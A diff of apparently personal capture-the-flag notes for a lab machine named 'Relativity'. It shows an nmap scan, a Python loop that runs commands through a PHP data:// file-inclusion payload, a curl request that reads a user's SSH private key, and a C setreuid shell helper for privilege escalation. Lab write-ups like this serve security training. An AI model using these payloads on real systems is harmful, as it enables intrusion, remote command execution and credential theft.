@@ -1,28 +1,32 @@
 <https://twitter.com/trbughunters/status/1279768631845494787>
+
 <https://book.hacktricks.xyz/pentesting-web/file-inclusion>
+
 <https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/>
+
 <https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html>
+
 
 ProFTPD 1.2.8 - 1.2.9 mod_sql, php wrappers data://text/plain;base64, UnrealIRCd
 
 # Scan
 
-└─$ sudo nmap -p- -sV 172.16.16.128      
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 18:43 CET
-Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
-SYN Stealth Scan Timing: About 0.10% done
-Nmap scan report for 172.16.16.128
-Host is up (0.00041s latency).
-Not shown: 65532 filtered ports
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     ProFTPD 1.2.8 - 1.2.9
-22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
-80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
-MAC Address: 00:0C:29:6A:3B:E0 (VMware)
-Service Info: Host: Relativity; OS: Unix
+    └─$ sudo nmap -p- -sV 172.16.16.128      
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-24 18:43 CET
+    Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+    SYN Stealth Scan Timing: About 0.10% done
+    Nmap scan report for 172.16.16.128
+    Host is up (0.00041s latency).
+    Not shown: 65532 filtered ports
+    PORT   STATE SERVICE VERSION
+    21/tcp open  ftp     ProFTPD 1.2.8 - 1.2.9
+    22/tcp open  ssh     OpenSSH 5.9 (protocol 2.0)
+    80/tcp open  http    Apache httpd 2.2.23 ((Fedora))
+    MAC Address: 00:0C:29:6A:3B:E0 (VMware)
+    Service Info: Host: Relativity; OS: Unix
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds
 
 
 # Exploit
@@ -79,11 +83,34 @@ Connection au server FTP
 
 
 
-==> script en python ??
+```python
+# command : ls -al /home
+# command : cat /home/mauk/.ssh/authorized_keys
+import requests
+import string
+import base64
+import re
 
-Discovery mauk rsa key
+req = requests.Session()
 
-    curl 'http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=cat%20/home/mauk/.ssh/id_rsa'
+# $ echo '<?php system($_GET['c']); ?>' | base64
+# PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K
+
+url = "http://172.16.16.128/0f756638e0737f4a0de1c53bf8937a08/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c="
+
+while True:
+    command = input("command : ")
+    
+    resp = req.get(url + command)
+    content = resp.text
+    # stripped = re.sub('<[^<]+?>', '', content)
+    # clean = re.sub('<?', '', stripped)
+    print(content)
+
+```
+
+
+Obtain mauk's rsa key, gain ssh connexion
 
 
 
@@ -175,15 +202,16 @@ Gain privileges jetta access
 Get jetta's UID 
 
 
-    ```c
+```c
 
-    void main() {
-        setreuid(geteuid(), getuid());
-        setregid(getegid(), getgid());
-        system("/bin.bash");
-    }
+void main() {
+    setreuid(geteuid(), getuid());
+    setregid(getegid(), getgid());
+    system("/bin.bash");
+}
 
-    ```
+```
+
     sh-4.2$ gcc get.c -o get
     sh-4.2$ id
     uid=1001(mauk) gid=1001(mauk) euid=1002(jetta) groups=1002(jetta),1001(mauk)
